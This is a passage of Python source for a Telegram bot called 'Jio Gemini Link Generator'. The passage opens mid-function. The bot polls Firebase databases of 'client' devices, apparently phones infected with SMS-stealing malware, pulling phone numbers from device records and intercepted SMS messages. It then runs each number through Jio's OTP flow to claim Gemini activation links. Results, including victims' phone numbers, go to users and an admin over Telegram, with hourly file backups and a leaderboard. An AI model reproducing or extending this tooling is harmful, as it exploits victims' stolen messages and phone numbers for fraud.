    # 6. Send to Telegram
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("Open Link", url=link))
    bot.send_message(chat_id,
        f"LINK FOUND!\n\nPhone: <code>{phone}</code>\nStatus: {status}\nLink: <code>{link}</code>",
        reply_markup=markup)

    try:
        bot.send_message(ADMIN_ID,
            f"New Link! {first_name} | <code>{phone}</code> | {status}\n<code>{link}</code>")
    except Exception:
        pass

    return True

# ==========================================
# GLOBAL STATE
# ==========================================
PROCESSED_NUMBERS = set()  # Track all numbers being/already processed

def mark_processed(phone):
    with FILE_LOCK:
        PROCESSED_NUMBERS.add(phone)

def is_processed(phone):
    return phone in PROCESSED_NUMBERS

# ==========================================
# PROCESS DEVICE (stockgro_auto.py style)
# ==========================================
def process_device(fb_url, device, chat_id, first_name):
    device_id = device.get("id", "")
    numbers_to_try = []

    # Extract numbers from device data
    nums_from_device = extract_nums_from_obj(device)
    for n in nums_from_device:
        if n not in numbers_to_try:
            numbers_to_try.append(n)

    # Extract numbers from SMS messages
    sms_phones = extract_phones_from_messages(fb_url, device_id)
    for sp in sms_phones:
        if sp not in numbers_to_try:
            numbers_to_try.append(sp)

    if not numbers_to_try:
        return

    # Filter used + already processing
    used = load_used()
    fresh = [n for n in numbers_to_try if n not in used and not is_processed(n)]
    if not fresh:
        return

    print(f"\n[*] Device: {device_id[:16]}... | Numbers: {', '.join(fresh)}")

    for mobile_no in fresh:
        if is_processed(mobile_no):
            continue
        used = load_used()
        if mobile_no in used:
            continue
        mark_processed(mobile_no)
        process_single_number(mobile_no, chat_id, first_name, fb_url, device_id)

# ==========================================
# CONTINUOUS WORKER (stockgro_auto.py main loop)
# ==========================================
def run_continuous_worker(chat_id, first_name):
    valid_links = load_links()
    if not valid_links:
        bot.send_message(chat_id, "No Firebase links! Add via links.txt or bot.")
        return

    executor = ThreadPoolExecutor(max_workers=3)
    poll_count = 0

    bot.send_message(chat_id,
        f"Polling started!\n\n"
        f"Firebase: {len(valid_links)}\n"
        f"Poll: 15s | Workers: 3")

    while not stop_event.is_set():
        try:
            poll_count += 1

            for fb_url, fb_key in valid_links:
                if stop_event.is_set():
                    break

                # Fetch clients
                url = f"{fb_url}/clients.json"
                if fb_key and fb_key != "dummy":
                    url += f"?auth={fb_key}"
                raw_clients = fetch_firebase(url)
                if not raw_clients or not isinstance(raw_clients, dict):
                    continue

                for device_id, device_data in raw_clients.items():
                    if stop_event.is_set():
                        break
                    if not isinstance(device_data, dict):
                        continue
                    if device_id in CURRENTLY_PROCESSING:
                        continue

                    # ONLY online devices (stockgro_auto.py style)
                    is_online = bool(device_data.get("status"))
                    if not is_online:
                        continue

                    # Check numbers
                    device_nums = extract_nums_from_obj(device_data)
                    sms_nums = extract_phones_from_messages(fb_url, device_id)
                    all_nums = list(set(device_nums + sms_nums))
                    used = load_used()
                    fresh = [n for n in all_nums if n not in used and not is_processed(n)]

                    if not fresh:
                        continue

                    # Wait for worker slot (non-blocking)
                    while len(CURRENTLY_PROCESSING) >= 3 and not stop_event.is_set():
                        time.sleep(0.5)
                    if stop_event.is_set():
                        break

                    CURRENTLY_PROCESSING.add(device_id)
                    device_for_processing = dict(device_data)
                    device_for_processing['id'] = device_id

                    def done_callback(future, d_id=device_id):
                        CURRENTLY_PROCESSING.discard(d_id)
                        try:
                            future.result()
                        except Exception as e:
                            print(f"[!] Worker error: {e}")

                    future = executor.submit(process_device, fb_url,
                                             device_for_processing, chat_id, first_name)
                    future.add_done_callback(done_callback)

            if poll_count % 4 == 0:
                bot.send_message(chat_id,
                    f"Poll #{poll_count} | "
                    f"Processing: {len(CURRENTLY_PROCESSING)} | "
                    f"Done: {len(used_cache)}")

            time.sleep(15)

        except Exception as e:
            print(f"[!] Poll error: {e}")
            time.sleep(15)

    bot.send_message(chat_id, "Stopped.")
    executor.shutdown(wait=False)

# ==========================================
# TELEGRAM HANDLERS
# ==========================================
def send_main_menu(chat_id, first_name, user_id=None):
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("🚀 Generate Jio Link (Manual)", callback_data="start_generate"))
    markup.add(InlineKeyboardButton("🤖 Auto Firebase (Continuous)", callback_data="start_firebase_auto"))
    markup.add(InlineKeyboardButton("🔍 Link Checker", callback_data="start_checker"))
    markup.add(InlineKeyboardButton("➕ Add Firebase URLs", callback_data="btn_add_text"))
    markup.add(InlineKeyboardButton("📁 Upload .txt File", callback_data="btn_add_file"))
    markup.add(InlineKeyboardButton("🏆 Leaderboard", callback_data="show_leaderboard"))
    markup.add(InlineKeyboardButton("🛑 Stop Auto", callback_data="stop_auto"))
    if user_id and int(user_id) == int(ADMIN_ID):
        markup.add(InlineKeyboardButton("👑 Admin Panel", callback_data="admin_panel"))
    bot.send_message(chat_id,
        f"🌟 <b>Welcome {first_name}!</b>\n\n"
        f"⚡️ <b>Jio Gemini Link Generator</b>\n\n"
        f"🔗 Firebase: <b>{len(load_links())}</b> | "
        f"📱 Processed: <b>{len(used_cache)}</b>",
        reply_markup=markup)

@bot.message_handler(commands=['start'])
def handle_start(message):
    if message.chat.type != "private":
        return
    send_main_menu(message.chat.id, message.from_user.first_name, message.from_user.id)

@bot.callback_query_handler(func=lambda c: c.data == "start_firebase_auto")
def cb_auto(call):
    stop_event.clear()
    bot.answer_callback_query(call.id, "🚀 Starting...")
    threading.Thread(target=run_continuous_worker,
                     args=(call.message.chat.id, call.from_user.first_name), daemon=True).start()

@bot.callback_query_handler(func=lambda c: c.data == "stop_auto")
def cb_stop(call):
    stop_event.set()
    bot.answer_callback_query(call.id, "🛑 Stopped!")

@bot.callback_query_handler(func=lambda c: c.data == "show_leaderboard")
def cb_leaderboard(call):
    if not leaderboard_data:
        bot.send_message(call.message.chat.id, "🏆 Empty!")
        return
    sorted_users = sorted(leaderboard_data.values(), key=lambda x: x.get('count', 0), reverse=True)
    text = "🏆 <b>TOP USERS</b>\n━━━━━━━━━━━━━\n"
    medals = ["🥇", "🥈", "🥉"]
    for i, u in enumerate(sorted_users[:10]):
        rank = medals[i] if i < 3 else f"<b>{i+1}.</b>"
        text += f"{rank} {u.get('name', '?')} ➔ <b>{u.get('count', 0)}</b>\n"
    bot.send_message(call.message.chat.id, text)

@bot.callback_query_handler(func=lambda c: c.data == "btn_add_text")
def cb_add_text(call):
    USER_WAITING_FOR[call.from_user.id] = "TEXT_URLS"
    bot.send_message(call.message.chat.id, "📝 <b>Firebase URLs bhejien:</b>")

@bot.callback_query_handler(func=lambda c: c.data == "btn_add_file")
def cb_add_file(call):
    USER_WAITING_FOR[call.from_user.id] = "TXT_FILE"
    bot.send_message(call.message.chat.id, "📁 <b>.txt file upload karein:</b>")

@bot.callback_query_handler(func=lambda c: c.data == "start_checker")
def cb_checker(call):
    USER_WAITING_FOR[call.from_user.id] = "LINK_CHECKER"
    bot.send_message(call.message.chat.id, "🔍 <b>Link bhejien:</b>")

@bot.callback_query_handler(func=lambda c: c.data == "back_to_menu")
def cb_back(call):
    USER_WAITING_FOR.pop(call.from_user.id, None)
    try:
        bot.delete_message(call.message.chat.id, call.message.message_id)
    except Exception:
        pass
    send_main_menu(call.message.chat.id, call.from_user.first_name, call.from_user.id)

@bot.callback_query_handler(func=lambda c: c.data == "admin_panel")
def cb_admin(call):
    if int(call.from_user.id) != int(ADMIN_ID):
        bot.answer_callback_query(call.id, "❌ Not admin!", show_alert=True)
        return
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("📊 Stats", callback_data="admin_stats"))
    markup.add(InlineKeyboardButton("🔄 Reset", callback_data="admin_reset"))
    bot.send_message(call.message.chat.id, "👑 <b>ADMIN</b>", reply_markup=markup)

@bot.callback_query_handler(func=lambda c: c.data == "admin_stats")
def cb_admin_stats(call):
    if int(call.from_user.id) != int(ADMIN_ID):
        return
    links = load_links()
    bot.send_message(call.message.chat.id,
        f"📊 Firebase: <b>{len(links)}</b>\n"
        f"📱 Processed: <b>{len(used_cache)}</b>\n"
        f"👷 Active: <b>{len(CURRENTLY_PROCESSING)}</b>")

@bot.callback_query_handler(func=lambda c: c.data == "admin_reset")
def cb_admin_reset(call):
    if int(call.from_user.id) != int(ADMIN_ID):
        return
    used_cache.clear()
    if os.path.exists(SCANNED_FILE):
        os.remove(SCANNED_FILE)
    bot.send_message(call.message.chat.id, "🔄 Done!")

# ==========================================
# TEXT & DOC HANDLERS
# ==========================================
@bot.message_handler(func=lambda m: m.chat.type == "private" and m.from_user.id in USER_WAITING_FOR)
def handle_inputs(message):
    uid = message.from_user.id
    state = USER_WAITING_FOR.pop(uid, None)
    if state == "TEXT_URLS":
        urls = re.findall(r'https?://[^\s"\',]+', message.text)
        with open(LINKS_FILE, "a") as f:
            for u in urls:
                f.write(f"{u.strip()}\n")
        bot.reply_to(message, f"✅ Added <b>{len(urls)}</b> URLs!")
    elif state == "LINK_CHECKER":
        links = re.findall(r'https?://[^\s]+', message.text)
        if not links:
            bot.reply_to(message, "⚠️ Koi link nahi mila.")
            return
        text = "🔍 <b>RESULTS:</b>\n\n"
        for i, url in enumerate(links[:15], 1):
            status = check_link_status(url)
            text += f"{i}. <code>{url}</code>\n{status}\n\n"
        bot.send_message(message.chat.id, text[:4000])

@bot.message_handler(content_types=['document'])
def handle_doc(message):
    uid = message.from_user.id
    state = USER_WAITING_FOR.get(uid)
    if not state or state != "TXT_FILE":
        return
    try:
        info = bot.get_file(message.document.file_id)
        content = bot.download_file(info.file_path).decode("utf-8", errors="ignore")
        with open(LINKS_FILE, "a") as f:
            f.write("\n" + content)
        USER_WAITING_FOR.pop(uid, None)
        bot.reply_to(message, "✅ File added!")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")

# ==========================================
# MANUAL GENERATE
# ==========================================
@bot.callback_query_handler(func=lambda c: c.data == "start_generate")
def cb_generate(call):
    msg = bot.send_message(call.message.chat.id, "📱 <b>Jio Number:</b>")
    bot.register_next_step_handler(msg, process_number_step)

def process_number_step(message):
    number = message.text.strip() if message.text else ""
    if not number.isdigit() or len(number) < 10:
        bot.send_message(message.chat.id, "❌ Invalid! /start")
        return
    status_msg = bot.send_message(message.chat.id, "⏳ Sending OTP...")
    threading.Thread(target=async_send_otp,
                     args=(message.chat.id, number, message.from_user.first_name), daemon=True).start()

def async_send_otp(chat_id, number, first_name):
    try:
        if not jio_mgr.is_jio(number):
            bot.send_message(chat_id, "Not a Jio number! /start")
            return
        data = jio_mgr.send_otp(number)
        if str(data.get("responseCode")) == "200":
            msg = bot.send_message(chat_id, "OTP Sent! Enter OTP:")
            bot.register_next_step_handler(msg, process_otp_step, number, first_name)
        else:
            bot.send_message(chat_id, f"Failed: {data.get('responseMessage', 'Error')}")
    except Exception:
        bot.send_message(chat_id, "Server slow! /start")

def process_otp_step(message, number, first_name):
    otp = message.text.strip() if message.text else ""
    bot.send_message(message.chat.id, "Verifying...")
    threading.Thread(target=async_verify_otp,
                     args=(message.chat.id, number, otp, first_name), daemon=True).start()

def async_verify_otp(chat_id, number, otp, first_name):
    try:
        data = jio_mgr.verify_otp(number, otp)
        if str(data.get("responseCode")) == "200":
            link, err = jio_mgr.get_activation()
            if link:
                status = check_link_status(link)
                save_used(number)
                markup = InlineKeyboardMarkup()
                markup.add(InlineKeyboardButton("Open Link", url=link))
                markup.add(InlineKeyboardButton("Generate More", callback_data="start_generate"))
                bot.send_message(chat_id, f"DONE!\n\n{status}\n<code>{link}</code>", reply_markup=markup)
                user_id_str = str(chat_id)
                with FILE_LOCK:
                    with open(LINKS_FILE, "a") as f:
                        f.write(f"[{datetime.now():%Y-%m-%d %H:%M:%S}] {first_name} | {number} | {status} | {link}\n")
                    if user_id_str not in leaderboard_data:
                        leaderboard_data[user_id_str] = {"name": first_name, "count": 0}
                    leaderboard_data[user_id_str]["count"] += 1
                    save_leaderboard()
            else:
                bot.send_message(chat_id, f"Failed: {err}")
        else:
            bot.send_message(chat_id, f"Invalid OTP: {data.get('responseMessage', 'Error')}")
    except Exception:
        bot.send_message(chat_id, "Timeout! /start")

# ==========================================
# HOURLY BACKUP
# ==========================================
def hourly_backup():
    while True:
        time.sleep(3600)
        try:
            if os.path.exists(LINKS_FILE) and os.path.getsize(LINKS_FILE) > 0:
                with open(LINKS_FILE, "rb") as doc:
                    bot.send_document(ADMIN_ID, doc, caption=f"⏰ Backup [{datetime.now():%H:%M}]")
        except Exception:
            pass

# ==========================================
# MAIN
# ==========================================
if __name__ == "__main__":
    used_cache = load_used()
    load_leaderboard()
    print("🚀 Jio Gemini Bot Started!")
    print(f"🔗 Links: {len(load_links())} | Processed: {len(used_cache)}")

    if TELEGRAM_PROXY:
        from telebot import apihelper
        apihelper.proxy = {"http": TELEGRAM_PROXY, "https": TELEGRAM_PROXY}

    threading.Thread(target=hourly_backup, daemon=True).start()

    while True:
        try:
            bot.infinity_polling(timeout=10, long_polling_timeout=5)
        except KeyboardInterrupt:
            print("[*] Stopped.")
            break
        except Exception as e:
            print(f"[!] Crashed: {e}")
            time.sleep(10)
